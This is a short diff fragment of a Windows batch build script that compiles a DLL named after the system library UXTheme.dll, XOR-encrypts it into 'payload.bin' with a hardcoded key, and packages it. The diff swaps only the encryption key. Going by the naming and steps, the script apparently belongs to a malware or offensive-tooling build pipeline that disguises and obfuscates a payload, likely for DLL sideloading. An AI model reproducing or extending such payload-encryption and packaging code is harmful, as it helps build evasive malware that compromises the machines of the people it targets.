@@ -12,7 +12,7 @@ advapi32.lib winhttp.lib bcrypt.lib user32.lib shell32.lib ^
 /Fe:UXTheme.dll /link /IMPLIB:UXTheme.lib
 
 echo [*] Encrypting Payload (UXTheme.dll -^> payload.bin)...
-powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('UXTheme.dll');$k=[Text.Encoding]::ASCII.GetBytes('aq4sB4C9Nph4CZq0');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]};[IO.File]::WriteAllBytes('payload.bin',$b)"
+powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('UXTheme.dll');$k=[Text.Encoding]::ASCII.GetBytes('1QO0kVer1PzENxox');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]};[IO.File]::WriteAllBytes('payload.bin',$b)"
 
 if not exist "payload.bin" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )
 echo [*] Packaging Resources...
